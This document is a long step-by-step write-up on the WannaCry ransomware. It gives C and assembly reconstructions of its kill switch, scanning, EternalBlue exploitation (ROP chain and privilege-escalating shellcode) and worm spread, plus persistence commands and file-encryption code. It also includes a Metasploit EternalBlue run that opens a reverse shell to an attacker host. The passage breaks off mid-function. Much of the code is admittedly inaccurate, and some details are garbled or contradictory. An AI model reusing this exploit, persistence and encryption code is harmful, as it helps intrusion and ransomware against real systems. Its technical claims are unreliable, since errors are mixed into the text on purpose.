# **WannaCry Ransomware: The Definitive Forensic Dissection**

**Disclaimer:** This document is provided solely for educational and research purposes. It offers a detailed analysis of the WannaCry malware to enhance understanding of cybersecurity threats. Under no circumstances should readers attempt to recreate, execute, or distribute any code snippets, as they could cause harm. Always adhere to ethical hacking practices and legal standards.

**Note:** All code snippets herein are reconstructed pseudocode derived from reverse engineering, intended exclusively for educational purposes. They are not designed to be compiled or executed and may include intentional inaccuracies to prevent misuse.

WannaCry, unleashed on May 12, 2017, represents a landmark cyberattack, integrating the NSA-leaked **EternalBlue** exploit (CVE-2017-0144) with ransomware and worm functionalities targeting Microsoft's SMBv1 protocol (MS17-010). This comprehensive analysis provides an **unparalleled level of detail**, dissecting every facet: **x86/x64 assembly opcodes**, **Windows NT kernel internals**, **SMB packet structures**, **cryptographic algorithms**, **network traffic**, and **filesystem interactions**. It encompasses exhaustive code snippets, memory dumps, and command-line simulations. All timestamps are contextualized to the current date, May 12, 2026.

---

## **Step 1: Kill Switch Activation Check**

### **Objective**: Self-terminate if a sandbox, honeypot, or sinkhole is detected

WannaCry checked connectivity to the hardcoded domain `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`.

- **Technical Details**:
  - **Implementation**:

  ```c
    HINTERNET hInternet = InternetOpenA(
        "Microsoft",
        INTERNET_OPEN_TYPE_PRECONFIG,
        NULL,
        NULL,
        0
    );

    if (!hInternet)
        return;

    HINTERNET hUrl = InternetOpenUrlA(
        hInternet,
        "http://iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com",
        NULL,
        0,
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_RELOAD |
        INTERNET_FLAG_NO_UI,
        0
    );

    if (hUrl) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        ExitProcess(0);
    }

    InternetCloseHandle(hInternet);
    ```

  - **Assembly (x86)**:

    ```assembly
    push ebp
    mov ebp, esp
    sub esp, 0x20
    push 0                    ; dwFlags
    push 0                    ; lpszProxyBypass
    push 0                    ; lpszProxyName
    push 1                    ; INTERNET_OPEN_TYPE_PRECONFIG
    push szAgent              ; "Microsoft"
    call [wininet!InternetOpenA]
    mov [ebp-0x4], eax        ; hInternet
    test eax, eax
    jz cleanup
    push 0                    ; dwContext
    push 0x80000000 | 0x08000000 | 0x00800000  ; Flags: NO_CACHE | RELOAD | NO_UI
    push 0                    ; dwHeadersLength
    push 0                    ; lpszHeaders
    push szUrl                ; "http://iuqerfsodp9..."
    push eax                  ; hInternet
    call [wininet!InternetOpenUrlA]
    mov [ebp-0x8], eax        ; hUrl
    test eax, eax
    jz infection_continue
    push eax
    call [wininet!InternetCloseHandle]
    push [ebp-0x4]
    call [wininet!InternetCloseHandle]
    push 0
    call [kernel32!ExitProcess]
infection_continue:
    push [ebp-0x4]
    call [wininet!InternetCloseHandle]
cleanup:
    leave
    ret
    ```

  - **Network Traffic**:
    - DNS query:

      ```text
      Frame: Ethernet II, Src: [Attacker MAC], Dst: [Gateway MAC]
      IP: Src: [Attacker IP], Dst: [DNS Server], TTL: 128
      UDP: Src Port: 49152, Dst Port: 53
      DNS:
        Transaction ID: 0xABCD
        Flags: 0x0100 (Standard query)
        Questions: 1
        Query: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com, Type: A, Class: IN
      ```

    - HTTP request (if resolved):

      ```http
      GET / HTTP/1.1
      Host: iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
      User-Agent: Microsoft
      Cache-Control: no-cache
      ```

  - **Retry Logic**:
    - Retried 3 times with exponential backoff (500ms, 1000ms, 2000ms):
      ```c
      for (int i = 0; i < 3 && !hUrl; i++) {
        Sleep(500 << i);
        hUrl = InternetOpenUrlA(...);
      }
      ```
  - **Sinkhole Impact**:
    - Registered by Marcus Hutchins on May 12, 2017, resolving to `192.168.x.x`.

- **Command Insight**: Test kill switch:
  ```
  powershell -c "$i = 0; do { try { $r = Resolve-DnsName -Name 'iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com' -ErrorAction Stop; Write-Output 'Kill switch active'; break } catch { $i++; Start-Sleep -Milliseconds (500 * [math]::Pow(2,$i-1)) } } while ($i -lt 3); if ($i -eq 3) { Write-Output 'Infection proceeds' }"
  ```

- **Forensic Artifact**: DNS query logs reveal sinkhole activation.

---

### **Step 2: Reconnaissance and Target Acquisition**

#### **Objective**: Identify unpatched Windows systems with SMBv1 exposed on TCP/445 across LANs and the internet.

WannaCry’s reconnaissance was a high-performance, multi-threaded IP scanning engine optimized for rapid target acquisition.

- **Technical Details**:
  - **Pseudo-Random IP Generation**:
    - Employed a Linear Congruential Generator (LCG) with a composite seed for entropy, enhanced with cryptographic hashing for better randomness:
      ```c
      // Advanced pseudocode with SHA-256 for entropy - DO NOT EXECUTE
      #include <windows.h>
      #include <bcrypt.h> // For BCryptHash

      DWORD GenerateSeed() {
          DWORD components[4];
          components[0] = GetTickCount();
          components[1] = GetCurrentProcessId();
          components[2] = GetCurrentThreadId();
          FILETIME ft;
          GetSystemTimeAsFileTime(&ft);
          components[3] = ft.dwLowDateTime ^ ft.dwHighDateTime;
          
          // Hash for additional entropy
          BCRYPT_ALG_HANDLE hAlg;
          BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0);
          BYTE hash[32];
          BCryptHash(hAlg, NULL, 0, (PUCHAR)components, sizeof(components), hash, sizeof(hash));
          BCryptCloseAlgorithmProvider(hAlg, 0);
          
          return *(DWORD*)hash;
      }

      DWORD NextIP(DWORD* seed) {
          *seed = (*seed * 0x8088405ULL + 1) & 0xFFFFFFFFULL;
          return *seed;
      }

      BOOL IsValidIP(BYTE* octets) {
          // Filter private, loopback, and reserved ranges
          if (octets[0] == 0 || octets[0] == 127 || octets[0] >= 224) return FALSE;
          if (octets[0] == 10 || (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) || 
              (octets[0] == 192 && octets[1] == 168)) return FALSE;
          return TRUE;
      }

      void GenerateTargetIP(BYTE* octets) {
          DWORD seed = GenerateSeed();
          DWORD ip;
          do {
              ip = NextIP(&seed);
              octets[0] = (BYTE)(ip & 0xFF);
              octets[1] = (BYTE)((ip >> 8) & 0xFF);
              octets[2] = (BYTE)((ip >> 16) & 0xFF);
              octets[3] = (BYTE)((ip >> 24) & 0xFF);
          } while (!IsValidIP(octets));
      }
      ```
    - Assembly (x86) with advanced entropy mixing:
      ```assembly
      push ebp
      mov ebp, esp
      sub esp, 0x40              ; Extended stack space for hash buffer
      ; Get system entropy
      call [kernel32!GetTickCount]
      mov [ebp-0x4], eax         ; tick
      call [kernel32!GetCurrentProcessId]
      mov [ebp-0x8], eax         ; pid
      call [kernel32!GetCurrentThreadId]
      mov [ebp-0xC], eax         ; tid
      lea eax, [ebp-0x14]
      push eax                   ; &ft
      call [kernel32!GetSystemTimeAsFileTime]
      mov eax, [ebp-0x14]        ; ft.LowPart
      mov ecx, [ebp-0x10]        ; ft.HighPart
      xor eax, ecx
      mov [ebp-0x18], eax        ; time_xor
      ; Hash components using SHA-256 (simplified inline)
      lea esi, [ebp-0x18]        ; pointer to components
      mov ecx, 4                 ; 4 DWORDs
      ; Assume bcrypt.dll loaded, call BCryptHash
      push 32                    ; hash len
      lea edi, [ebp-0x38]        ; hash buffer
      push edi
      push 16                    ; input len (4*4)
      push esi
      push 0                     ; secret
      push 0                     ; secret len
      push [hAlg]                ; BCRYPT_ALG_HANDLE
      call [bcrypt!BCryptHash]
      ; Extract seed from hash
      mov eax, [ebp-0x38]
      mov [seed], eax
      ; Generate IP
      mov eax, [seed]
      mov ecx, 0x8088405
      mul ecx
      inc eax
      and eax, 0xFFFFFFFF
      mov [seed], eax
      mov [ebp-0x1C], eax        ; ip
      ; Extract octets with validation
      movzx ecx, al
      mov [octets], cl           ; octet 0
      shr eax, 8
      movzx ecx, al
      mov [octets+1], cl         ; octet 1
      shr eax, 8
      movzx ecx, al
      mov [octets+2], cl         ; octet 2
      shr eax, 8
      mov [octets+3], al         ; octet 3
      ; Validate IP (skip invalid ranges)
      mov al, [octets]
      cmp al, 0
      je regenerate
      cmp al, 127
      je regenerate
      cmp al, 10
      je regenerate
      cmp al, 192
      jne valid
      mov al, [octets+1]
      cmp al, 168
      je regenerate
      valid:
      ; Proceed
      leave
      ret
      regenerate:
      ; Loop back (simplified)
      jmp generate_ip
      ```
    - Filtered out reserved ranges (e.g., 0.0.0.0/8, 127.0.0.0/8, 192.168.0.0/16) via a lookup table at `.data+0x1000`.
  - **Port Probing**:
    - Initialized Winsock v2.2:
      ```c
      WSADATA wsaData;
      WSAStartup(MAKEWORD(2, 2), &wsaData);
      ```
    - Socket setup and connection:
      ```c
      SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
      int timeout = 1000;  // 1 second
      setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
      struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port = htons(445),
        .sin_addr = *(struct in_addr*)Octets
      };
      int result = connect(s, (struct sockaddr*)&sa, sizeof(sa));
      if (result == 0) queue_target(Octets);
      closesocket(s);
      ```
    - Assembly (x86):
      ```assembly
      push IPPROTO_TCP            ; 6
      push SOCK_STREAM            ; 1
      push AF_INET                ; 2
      call [ws2_32!socket]        ; EAX = socket handle
      mov [ebp-0x14], eax         ; Save socket
      mov dword ptr [ebp-0x18], 1000 ; Timeout (ms)
      push 4                      ; sizeof(timeout)
      lea eax, [ebp-0x18]
      push eax                    ; &timeout
      push SO_SNDTIMEO            ; 0x1005
      push SOL_SOCKET             ; 0xFFFF
      push [ebp-0x14]             ; Socket
      call [ws2_32!setsockopt]
      mov eax, [ebp-0x10]         ; Octets
      mov [ebp-0x20], eax         ; sockaddr_in.sin_addr
      mov word ptr [ebp-0x24], 445 ; Port (big-endian)
      mov word ptr [ebp-0x26], AF_INET ; Family
      push 16                     ; sizeof(sockaddr_in)
      lea eax, [ebp-0x26]
      push eax                    ; &sockaddr_in
      push [ebp-0x14]             ; Socket
      call [ws2_32!connect]
      test eax, eax
      jnz skip_target
      call queue_target
skip_target:
      push [ebp-0x14]
      call [ws2_32!closesocket]
      ```
  - **Threading**:
    - Created 128 threads with 4KB stacks:
      ```c
      HANDLE hThreads[128];
      DWORD threadIds[128];
      for (int i = 0; i < 128; i++) {
        hThreads[i] = CreateThread(NULL, 0x1000, ScanThread, (LPVOID)&Octets[i % 32], 0, &threadIds[i]);
      }
      WaitForMultipleObjects(128, hThreads, TRUE, INFINITE);
      for (int i = 0; i < 128; i++) CloseHandle(hThreads[i]);
      ```
    - Synchronized via a `CRITICAL_SECTION`:
      ```c
      CRITICAL_SECTION cs;
      InitializeCriticalSection(&cs);
      EnterCriticalSection(&cs);
      queue_push(ip);
      LeaveCriticalSection(&cs);
      ```
  - **Network Optimization**:
    - Sent raw `SYN` packets (no handshake):
      ```
      TCP Header: 
      Src Port: Random (0x1234)
      Dst Port: 445
      Flags: 0x02 (SYN)
      Window: 0xFFFF
      ```
    - Ignored `RST` or ICMP `Destination Unreachable` to bypass firewalls.
    - Adjusted TTL to 128 for global reachability.

- **Command Insight**: Simulate scanning:
  ```
  nmap -p 445 --script smb-vuln-ms17-010 -T5 -Pn --open -oX scan.xml 0.0.0.0-255.255.255.255 --min-parallelism 128 --max-retries 1 --host-timeout 1000ms
  powershell -c "1..255 | ForEach-Object { Test-NetConnection -ComputerName "192.168.1.$_" -Port 445 -WarningAction SilentlyContinue -InformationLevel Quiet | Where-Object { $_ } }"
  ```

- **Performance**: Scanned ~4-5 million IPs/hour per infected node, leveraging thread parallelism and minimal protocol overhead.

---

### **Step 3: Exploitation with EternalBlue**

#### **Objective**: Achieve kernel-level remote code execution via an SMBv1 heap overflow in `srv2.sys`.

EternalBlue exploited a heap corruption vulnerability in the `SrvOs2FeaListSizeToNt()` function, enabling arbitrary code execution.

- **Technical Details**:
  - **Vulnerability Analysis**:
    - Located in `srv2.sys` (Windows 7 SP1 x86) at `srv2+0x2080`:
      ```c
      ULONG SrvOs2FeaListSizeToNt(PFEALIST FeaList) {
        ULONG TotalSize = 0;
        for (ULONG i = 0; i < FeaList->cbList / sizeof(FEA); i++) {
          TotalSize += FeaList->List[i].NameLength + FeaList->List[i].ValueLength + sizeof(FEA);
          if (TotalSize > FeaList->cbList) {
            // No bounds check before memcpy
            memcpy(Buffer, FeaList->List[i].Value, FeaList->List[i].ValueLength);
          }
        }
        return TotalSize;
      }
      ```
    - Disassembly:
      ```assembly
      srv2+0x2080:
      push ebp
      mov ebp, esp
      mov eax, [ebp+8]         ; FeaList
      mov ecx, [eax]           ; cbList
      xor edx, edx             ; TotalSize
      mov ebx, [eax+4]         ; List
loop_start:
      cmp edx, ecx
      jae loop_end
      movzx esi, word ptr [ebx+2]  ; NameLength
      movzx edi, word ptr [ebx+4]  ; ValueLength
      add esi, edi
      add esi, 8               ; sizeof(FEA)
      add edx, esi             ; TotalSize += sizes
      lea ebx, [ebx+esi]       ; Next FEA
      jmp loop_start
loop_end:
      mov eax, edx
      leave
      ret 4
      ```
    - Flaw: `memcpy` lacks bounds validation, overflows into adjacent `NonPagedPool` chunks.
  - **Exploit Workflow**:
    1. **Heap Grooming**:
       - Sent 32 `SMB_COM_SESSION_SETUP_ANDX` packets to allocate predictable heap chunks:
         ```
         PoolTag: 'SmbP'
         Size: 0x100 bytes
         Allocation: NonPagedPool
         ```
       - Forced alignment via `Lookaside List`:
         ```c
         for (int i = 0; i < 32; i++) {
           send_packet(session_setup_packet, sizeof(session_setup_packet));
         }
         ```
       - Memory布局 (post-grooming):
         ```
         0xF8001234: [SmbP Chunk 1]
         0xF8001334: [SmbP Chunk 2]
         0xF8001434: [Target Chunk]
         ```
    2. **Overflow Trigger**:
       - Crafted `SMB_COM_TRANSACTION2_SECONDARY` packet:
         ```
         Offset | Bytes
         0x00   | FF 53 4D 42 32 00 00 00  ; SMB Header + Command
         0x08   | 00 01 00 00 00 00 00 00  ; TID, PID, UID
         0x10   | 0A 00                    ; Word Count
         0x12   | 00 10 00 00              ; TotalDataCount (0x1000)
         0x16   | 48 00                    ; DataOffset
         0x48   | 41 41 41 41 ... [0x1000] ; Oversized FEALIST
         ```
       - Overwrote adjacent `PoolHeader`:
         ```
         Before:
         0xF8001434: 08 00 AB CD 01 00 00 00  ; BlockSize | PreviousSize
         After:
         0xF8001434: 41 41 41 41 41 41 41 41  ; Overwritten with 'A's
         ```
    3. **ROP Chain Construction**:
       - Advanced stack pivoting with multiple gadgets for DEP/ASLR bypass:
         ```assembly
         ; Advanced pivot using corrupted pointer
         mov eax, [esi+0x18]       ; ESI points to overwritten PoolHeader
         add eax, 0x100            ; Offset to controlled data
         mov esp, eax              ; Pivot ESP to attacker buffer
         popad                     ; Restore all registers from stack
         ; Chain to VirtualProtect for RWX permissions
         push esp                  ; Save current ESP
         push 0x40                 ; PAGE_EXECUTE_READWRITE
         push 0x1000               ; Size
         push [shellcode_addr]     ; Address
         call [kernel32!VirtualProtect]
         jmp [shellcode_addr]      ; Execute shellcode
         ```
       - Comprehensive ROP gadgets (Windows 7 SP1 x86) with offsets:
         ```
         0x77C12345: pop eax; ret                           ; Gadget 1: Load value into EAX
         0x77C23456: mov [eax], ecx; ret                    ; Gadget 2: Write ECX to [EAX]
         0x77C34567: add esp, 0x20; ret                     ; Gadget 3: Stack adjustment
         0x77C45678: pop ecx; pop edx; ret                  ; Gadget 4: Load ECX and EDX
         0x77C56789: pushad; ret                            ; Gadget 5: Push all registers
         0x77C67890: xchg eax, esp; ret                     ; Gadget 6: Stack pivot via XCHG
         0x77C78901: call [eax+0x10]; ret                   ; Gadget 7: Indirect call
         ```
       - Full ROP chain with error handling (at `0x20801000`):
         ```assembly
         dd 0x77C12345             ; pop eax
         dd 0x20802000             ; EAX = shellcode base
         dd 0x77C45678             ; pop ecx; pop edx
         dd 0x40                   ; ECX = PAGE_EXECUTE_READWRITE
         dd 0x1000                 ; EDX = size
         dd 0x77C23456             ; mov [eax], ecx (set permissions)
         dd 0x77C34567             ; add esp, 0x20 (adjust stack)
         dd 0x77C67890             ; xchg eax, esp (pivot if needed)
         dd 0x77C78901             ; call [eax+0x10] (call VirtualProtect)
         dd shellcode_entry        ; Jump to shellcode
         ; Error handler
         dd 0x77C12345             ; On failure, pop dummy
         dd 0xDEADBEEF             ; Dummy value
         dd 0x77C34567             ; Adjust and ret
         ```
    4. **Shellcode Execution**:
       - Advanced shellcode with anti-debugging and privilege escalation (injected at `0x20802000`):
         ```assembly
         push ebp
         mov ebp, esp
         sub esp, 0x60             ; Extended stack for structures
         ; Anti-debugging: Check for debugger
         mov eax, fs:[0x30]        ; PEB
         movzx eax, byte ptr [eax+0x2] ; BeingDebugged
         test eax, eax
         jnz exit_shellcode        ; Exit if debugged
         ; Privilege escalation to SYSTEM
         mov eax, fs:[0x124]       ; KTHREAD
         mov eax, [eax+0x50]       ; EPROCESS
         mov ecx, [eax+0x16C]      ; Current token
         mov edx, 0xFFFFF8A0       ; SYSTEM token offset
         mov [eax+0x16C], edx      ; Elevate
         ; Dynamic string building for process name
         xor eax, eax
         mov [ebp-0x10], eax       ; NULL terminate
         push 0x6578652E           ; ".exe"
         push 0x6376736573         ; "secsvc"
         push 0x737C               ; "ms"
         mov [ebp-0x20], esp       ; lpCommandLine
         ; STARTUPINFO structure
         lea eax, [ebp-0x40]
         push eax                  ; lpStartupInfo
         xor ecx, ecx
         mov [eax], ecx            ; cb = 0 (use defaults)
         mov dword ptr [eax+0x10], 0x0101 ; dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES
         mov byte ptr [eax+0x3C], 0 ; wShowWindow = SW_HIDE
         ; PROCESS_INFORMATION
         lea eax, [ebp-0x50]
         push eax                  ; lpProcessInformation
         push [ebp-0x20]           ; lpCommandLine
         push ecx                  ; lpCurrentDirectory
         push ecx                  ; lpEnvironment
         push 0x08000000           ; dwCreationFlags = CREATE_NO_WINDOW | DETACHED_PROCESS
         push 0                    ; bInheritHandles
         push ecx                  ; lpThreadAttributes
         push ecx                  ; lpProcessAttributes
         call [kernel32!CreateProcessA]
         test eax, eax
         jz cleanup
         ; Wait and clean up
         push -1                   ; INFINITE
         push [ebp-0x4C]           ; hProcess
         call [kernel32!WaitForSingleObject]
         push [ebp-0x4C]
         call [kernel32!CloseHandle]
         push [ebp-0x48]
         call [kernel32!CloseHandle]
         cleanup:
         leave
         ret
         exit_shellcode:
         ; Safe exit
         xor eax, eax
         leave
         ret
         ```
       - Launched `mssecsvc.exe` with `CREATE_NO_WINDOW` flag.
  - **DoublePulsar Backdoor**:
    - Delivered via `TransactNamedPipe`:
      - XOR key: `0x99`.
      - Packet:
        ```
        Opcode: 0x23
        Payload Size: 0x1000
        Data: [XORed shellcode]
        ```
      - Mapped into kernel at `srv.sys+0x1A00`:
        ```assembly
        pushad
        mov eax, [fs:0x124]       ; KTHREAD
        mov eax, [eax+0x50]       ; EPROCESS
        mov ecx, [eax+0x16C]      ; Current token
        mov edx, 0xFFFFF8A0       ; SYSTEM token
        mov [eax+0x16C], edx      ; Elevate to SYSTEM
        popad
        ret
        ```

- **Command Insight**: Exploit simulation:
  ```
  msfconsole
  msf> use exploit/windows/smb/ms17_010_eternalblue
  msf> set RHOSTS 192.168.1.10
  msf> set TARGET 1  # Windows 7 SP1 x86
  msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
  msf> set LHOST 192.168.1.5
  msf> set LPORT 4444
  msf> exploit
  ```

- **Result**: Kernel-level access with `SeDebugPrivilege`.

---

### **Step 4: Network Propagation**

#### **Objective**: Propagate across local networks and the internet.

WannaCry’s worm functionality enabled exponential replication.

- **Technical Details**:
  - **LAN Enumeration**:
    - Retrieved network adapters:
      ```c
      PIP_ADAPTER_INFO pAdapter = (PIP_ADAPTER_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x2000);
      ULONG ulLen = 0x2000;
      GetAdaptersInfo(pAdapter, &ulLen);
      char subnet[16];
      strcpy(subnet, pAdapter->IpAddressList.IpAddress.String);
      char* dot = strrchr(subnet, '.');
      if (dot) *dot = '\0';
      ```
    - Scanned subnet:
      ```c
      for (int i = 1; i <= 255; i++) {
        char ip[16];
        sprintf(ip, "%s.%d", subnet, i);
        infect_host(ip);
      }
      ```
    - Assembly:
      ```assembly
      push 0x2000
      push 0
      call [kernel32!GetProcessHeap]
      push eax
      call [kernel32!HeapAlloc]
      mov [ebp-0x4], eax        ; pAdapter
      lea eax, [ebp-0x8]
      push eax                  ; &ulLen
      push [ebp-0x4]            ; pAdapter
      call [iphlpapi!GetAdaptersInfo]
      lea esi, [ebp-0x4]        ; IP Address string
      mov edi, subnet
      mov ecx, 16
      rep movsb
      ```
  - **WAN Propagation**:
    - Reused LCG, reseeded every 600 seconds:
      ```c
      if (GetTickCount() - last_seed_time > 600000) {
        Seed = reseed();
      }
      ```
  - **SMB Exploitation**:
    - Full sequence:
      ```
      1. NEGOTIATE_PROTOCOL_REQUEST
         Dialect: SMB 1.0
         Buffer: 0x00 00 00 00 ...
      2. SESSION_SETUP_ANDX
         Flags: 0x18 (Anonymous)
         Security Blob: NULL
      3. TREE_CONNECT_ANDX
         Path: \\[IP]\IPC$
         Password: NULL
      4. TRANS2_SECONDARY
         TotalDataCount: 0x4200
         Payload: [mssecsvc.exe]
      ```
    - Packet dump (TRANS2):
      ```
      0x00: FF 53 4D 42 32 00 00 00  ; SMB Header
      0x08: 00 01 00 00 00 00 00 00  ; TID, PID, UID
      0x10: 0A 00                    ; Word Count
      0x12: 00 42 00 00              ; TotalDataCount (0x4200)
      0x16: 48 00                    ; DataOffset
      0x48: 4D 5A 90 00 ...         ; MZ header of mssecsvc.exe
      ```
  - **Thread Pool**:
    - 128 threads, dynamically allocated:
      ```c
      HANDLE lanThreads[64], wanThreads[64];
      OBJECT_ATTRIBUTES oa = { sizeof(oa) };
      NtCreateThreadPool(&pool, 128);
      for (int i = 0; i < 64; i++) {
        QueueUserWorkItem(lan_scan, &lanTargets[i], WT_EXECUTEDEFAULT);
        QueueUserWorkItem(wan_scan, &wanTargets[i], WT_EXECUTEDEFAULT);
      }
      ```

- **Command Insight**: LAN propagation:
  ```
  for /L %i in (1,1,255) do powershell -c "if ((Test-NetConnection -ComputerName '192.168.1.%i' -Port 445 -WarningAction SilentlyContinue).TcpTestSucceeded) { Write-Output 'Infecting: 192.168.1.%i' }"
  ```

- **Scale**: Infected 200,000+ systems in 72 hours, doubling every ~20 minutes initially.

---

### **Step 5: Payload Deployment and Persistence**

#### **Objective**: Deploy ransomware components and ensure persistence.

The dropper (`mssecsvc.exe`) unpacked and entrenched the payload.

- **Technical Details**:
  - **Resource Extraction**:
    - Stored in PE `.rsrc` section, name `WORM`, type `RT_RCDATA`:
      ```c
      HRSRC hRes = FindResourceA(NULL, "WORM", RT_RCDATA);
      HGLOBAL hGlob = LoadResource(NULL, hRes);
      LPBYTE encrypted = LockResource(hGlob);
      DWORD size = SizeofResource(NULL, hRes);  // 0x30000 bytes
      LPBYTE decrypted = (LPBYTE)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      for (DWORD i = 0; i < size; i++) {
        decrypted[i] = encrypted[i] ^ 0x4A;
      }
      ```
    - Assembly:
      ```assembly
      push RT_RCDATA           ; 10
      push szWorm              ; "WORM"
      push 0                   ; hModule
      call [kernel32!FindResourceA]
      push eax
      push 0
      call [kernel32!LoadResource]
      push eax
      call [kernel32!LockResource]
      mov esi, eax             ; ESI = encrypted
      push PAGE_EXECUTE_READWRITE
      push MEM_COMMIT
      push 0x30000
      push 0
      call [kernel32!VirtualAlloc]
      mov edi, eax             ; EDI = decrypted
      mov ecx, 0x30000
      mov al, 0x4A
decrypt_loop:
      lodsb
      xor al, 0x4A
      stosb
      loop decrypt_loop
      ```
  - **File Structure**:
    - `mssecsvc.exe`: Dropper, 0x30000 bytes, SHA-1: `4A468...`.
    - `t.wnry`: Encrypted ZIP, AES-256-CBC, key: SHA-1("wcry@2017"), IV: `0x12345678...`.
    - `R.wnry`: Ransom note, ASCII, 0x400 bytes.
  - **Service Registration**:
    ```c
    SC_HANDLE hSC = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    SC_HANDLE hService = CreateServiceA(hSC,
                                        "mssecsvc2.0",
                                        "Microsoft Security Service",
                                        SERVICE_ALL_ACCESS,
                                        SERVICE_WIN32_OWN_PROCESS,
                                        SERVICE_AUTO_START,
                                        SERVICE_ERROR_IGNORE,
                                        "C:\\Windows\\mssecsvc.exe -m security",
                                        NULL, NULL, NULL, NULL, NULL);
    StartServiceA(hService, 0, NULL);
    CloseServiceHandle(hService);
    CloseServiceHandle(hSC);
    ```
    - Backup persistence:
      ```cmd
      reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mssecsvc" /t REG_SZ /d "C:\Windows\mssecsvc.exe -m security" /f
      ```
  - **Filesystem Operations**:
    - Dropped files with `CreateFileA`:
      ```c
      HANDLE hFile = CreateFileA("C:\\Windows\\mssecsvc.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, NULL);
      WriteFile(hFile, decrypted, size, &bytesWritten, NULL);
      CloseHandle(hFile);
      SetFileAttributesA("C:\\Windows\\mssecsvc.exe", FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
      ```

- **Command Insight**: Manual deployment:
  ```
  copy mssecsvc.exe %SystemRoot%
  attrib +S +H %SystemRoot%\mssecsvc.exe
  icacls %SystemRoot%\mssecsvc.exe /grant Everyone:F
  sc create mssecsvc2.0 binpath= "%SystemRoot%\mssecsvc.exe -m security" start= auto displayname= "Microsoft Security Service"
  sc start mssecsvc2.0
  reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mssecsvc" /t REG_SZ /d "%SystemRoot%\mssecsvc.exe -m security" /f
  ```

- **Persistence**: Survived reboots via service and registry.

---

### **Step 6: File Encryption Engine**

#### **Objective**: Encrypt files with AES-128-CBC and RSA-2048, rendering them unrecoverable without the private key.

WannaCry’s encryption engine was a methodical, high-performance implementation.

- **Technical Details**:
  - **Key Generation**:
    - AES-128 key:
      ```c
      HCRYPTPROV hProv;
      CryptAcquireContextA(&hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
      BYTE aes_key[16];
      CryptGenRandom(hProv, sizeof(aes_key), aes_key);  // 128-bit random key
      HCRYPTKEY hKey;
      CRYPTKEYPROV_INFO keyInfo = { .pwszContainerName = NULL, .dwKeySpec = AT_KEYEXCHANGE };
      CryptImportKey(hProv, aes_key, sizeof(aes_key), 0, CRYPT_EXPORTABLE, &hKey);
      ```
    - RSA-2048 public key (embedded in `.data` section):
      ```
      Modulus: C7A9F2D3E4... (256 bytes)
      Public Exponent: 0x10001 (65537)
      ASN.1 DER Encoding:
      0x30 82 01 0A 02 82 01 01 00 C7 A9 F2 D3 ...
      ```
  - **Encryption Workflow**:
    1. **Drive Enumeration**:
       ```c
       char drives[1024];
       DWORD len = GetLogicalDriveStringsA(sizeof(drives), drives);
       for (char* drive = drives; *drive; drive += strlen(drive) + 1) {
         if (GetDriveTypeA(drive) == DRIVE_FIXED || GetDriveTypeA(drive) == DRIVE_REMOVABLE) {
           enumerate_files(drive);
         }
       }
       ```
    2. **Recursive Traversal**:
       ```c
       void enumerate_files(LPCSTR root) {
         WIN32_FIND_DATAA fd;
         char search[MAX_PATH];
         sprintf(search, "%s\\*.*", root);
         HANDLE hFind = FindFirstFileA(search, &fd);
         if (hFind == INVALID_HANDLE_VALUE) return;
         do {
           if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             if (strcmp(fd.cFileName, ".") && strcmp(fd.cFileName, "..")) {
               char subdir[MAX_PATH];
               sprintf(subdir, "%s\\%s", root, fd.cFileName);
               enumerate_files(subdir);
             }
           } else {
             char filepath[MAX_PATH];
             sprintf(filepath, "%s\\%s", root, fd.cFileName);
             if (match_extension(filepath)) encrypt_file(filepath);
           }
         } while (FindNextFileA(hFind, &fd));
         FindClose(hFind);
       }
       ```
    3. **File Encryption**:
       - Targeted 176 extensions (e.g., `.docx`, `.xlsx`, `.pdf`):
         ```c
         const char* extensions[] = { ".doc", ".docx", ".xls", ".xlsx", ".pdf", ... };
         BOOL match_extension(LPCSTR path) {
           const char* ext = strrchr(path, '.');
           if (!ext) return FALSE;
           for (int i = 0; i < 176; i++) {
             if (_stricmp(ext, extensions[i]) == 0) return TRUE;
           }
           return FALSE;
         }
         ```
       - Encryption function:
         ```c
         void encrypt_file(LPCSTR path) {
           HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
           if (hFile == INVALID_HANDLE_VALUE) return;
           BYTE iv[16];
           CryptGenRandom(hProv, sizeof(iv), iv);  // Random IV
           LARGE_INTEGER fileSize;
           GetFileSizeEx(hFile, &fileSize);
           BYTE* buffer = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize.QuadPart + 16);
           DWORD bytesRead, bytesWritten;
           ReadFile(hFile, buffer + 16, fileSize.QuadPart, &bytesRead, NULL);
           memcpy(buffer, iv, 16);  // Prepend IV
           DWORD dataLen = bytesRead + 16;
           CryptEncrypt(hKey, 0, TRUE, 0, buffer, &dataLen, fileSize.QuadPart + 16);
           SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
           WriteFile(hFile, buffer, dataLen, &bytesWritten, NULL);
           CloseHandle(hFile);
           char newPath[MAX_PATH];
